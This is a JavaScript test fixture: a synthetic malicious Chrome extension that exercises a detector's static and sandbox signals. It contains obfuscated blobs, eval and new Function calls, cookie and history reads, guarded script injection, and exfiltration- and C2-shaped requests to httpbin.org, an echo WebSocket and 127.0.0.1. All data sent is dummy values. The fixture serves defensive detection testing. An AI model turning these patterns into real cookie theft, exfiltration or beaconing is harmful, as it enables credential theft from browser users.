// ============================================================================
// WebSentinel C1 — SYNTHETIC malicious extension for pipeline verification.
//
// THIS IS NOT REAL MALWARE. It steals nothing. Every "exfiltrated" value below
// is a hard-coded dummy constant, and the only network destination is
// httpbin.org, a public request-echo service. It is safe to load and run.
//
// Its job is to exhibit, for real, the static patterns C1 claims to detect and
// the runtime behaviours the dynamic sandbox claims to observe — so that a
// green pipeline actually means something.
//
// NOTE (2026-08-28): the previous version of this file described these signals
// in comments but did not contain them. `executeScript` appeared without
// parentheses so the regex never matched (exec_script_count was 0, not 5); the
// base64 blobs were ~80 chars against a 100-char minimum (long_string_count 0);
// and document.cookie / keydown were only named in prose, never written. All of
// those are now genuinely present, so the fixture exercises the detectors it
// was always meant to exercise.
// ============================================================================
'use strict';

(function () {

  // ── Obfuscated payload blobs (>=100 chars → long_string_count) ─────────────
  var _b1 = 'YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkrLzAxMjM0NTY3ODlhYmNkZWZnaGlqaw==';
  var _b2 = 'dGhpcyBpcyBhIGRlbGliZXJhdGVseSBsb25nIGJhc2U2NCBsb29raW5nIHN0cmluZyB1c2VkIG9ubHkgdG8gdHJpZ2dlciB0aGUgc3RhdGljIGFuYWx5c2Vy';
  var _b3 = 'c3VzcGljaW91c2xvbmdzdHJpbmdudW1iZXJ0aHJlZWZvcnN0YXRpY2FuYWx5c2lzcGFkZGluZ3BhZGRpbmdwYWRkaW5ncGFkZGluZ3BhZGRpbmdwYWQ=';

  // ── Hex-escape obfuscation (→ hex_escape_count) ────────────────────────────
  var _h = '\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64';

  // ── Base64 decoding of the payload (→ atob_count) ──────────────────────────
  var _d = [];
  try {
    _d.push(atob('aGVsbG8='));
    _d.push(atob('d29ybGQ='));
    _d.push(atob('dGVzdA=='));
    _d.push(atob('cGF5bG9hZA=='));
    _d.push(atob('Y29tbWFuZA=='));
    _d.push(atob('ZXhmaWw='));
    _d.push(atob('c3RhZ2Ux'));
    _d.push(atob('c3RhZ2Uy'));
    _d.push(atob(_b1.slice(0, 8)));
  } catch (_) {}

  // ── Dynamic code construction (→ function_ctor_count / eval_count) ─────────
  // MV3's CSP blocks these at runtime; they are wrapped so the worker survives.
  // The static scanner counts the source text either way, which is the point.
  function _stage(src) {
    try { return new Function('return ' + src); } catch (_) { return null; }
  }
  _stage('1+1'); _stage('2+2'); _stage('3+3'); _stage('4+4'); _stage('5+5');

  function _run(code) {
    try { return eval(code); } catch (_) { return null; }        // eval()
  }
  if (globalThis.__never__) {
    _run('1'); _run('2'); _run('3'); _run('4');
    _run('5'); _run('6'); _run('7'); _run('8');
  }

  // ── Credential/state harvesting surface (→ cookie_in_code) ─────────────────
  // Reads are real API calls but the results are discarded — nothing is sent.
  function _harvest() {
    try {
      chrome.cookies.getAll({}, function (c) { void c; });
      chrome.cookies.getAll({ domain: 'example.com' }, function (c) { void c; });
    } catch (_) {}
    try { void document.cookie; } catch (_) {}
    try { chrome.history.search({ text: '', maxResults: 1 }, function (h) { void h; }); } catch (_) {}
  }

  // ── Script injection into every tab (→ exec_script_count) ──────────────────
  // Guarded behind a flag that is never set, so nothing is actually injected.
  function _inject(tabId) {
    if (!globalThis.__never__) { return; }
    try {
      chrome.scripting.executeScript({ target: { tabId: tabId }, func: function () {} });
      chrome.scripting.executeScript({ target: { tabId: tabId }, files: ['content.js'] });
      chrome.scripting.executeScript({ target: { tabId: tabId }, func: function () {} });
      chrome.scripting.executeScript({ target: { tabId: tabId }, files: ['content.js'] });
      chrome.scripting.executeScript({ target: { tabId: tabId }, func: function () {} });
      chrome.scripting.insertCSS({ target: { tabId: tabId }, css: 'body{}' });
    } catch (_) {}
  }

  // ── Dynamic signals — delayed so the sandbox's listeners attach first ──────
  setTimeout(function () {

    _harvest();
    _inject(-1);

    // Exfiltration-shaped POST → DATA_POST_TO_EXTERNAL in the sandbox.
    // Body is dummy constants only.
    //
    // Uses fetch(), NOT XMLHttpRequest: MV3 background code runs in a service
    // worker, where XMLHttpRequest simply does not exist. The previous version
    // used XHR, so the POST silently never happened and the sandbox recorded
    // zero network requests — the signal this fixture exists to demonstrate.
    try {
      fetch('https://httpbin.org/post', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: _d.join(''), blob: _b1.slice(0, 32), tag: _h })
      }).catch(function () {});
    } catch (_) {}

    // Persistent C2-shaped channel → WEBSOCKET_TO_EXTERNAL in the sandbox.
    try {
      var ws = new WebSocket('wss://echo.websocket.events');
      ws.addEventListener('open', function () { ws.send('probe'); ws.close(); });
    } catch (_) {}

    // Raw-IP callback → SUSPICIOUS_DOMAIN. Real C2 channels routinely use a
    // bare IP to skip DNS. Pointed at 127.0.0.1 on a closed port, so the
    // request is issued and observed but nothing ever leaves this machine.
    fetch('http://127.0.0.1:9/beacon').catch(function () {});
    fetch('http://127.0.0.1:9/task').catch(function () {});

    // Beacon volume → HIGH_REQUEST_VOLUME (fires above 20 unique external URLs)
    for (var i = 1; i <= 25; i++) {
      fetch('https://httpbin.org/get?q=' + i).catch(function () {});
    }

  }, 3000);

})();
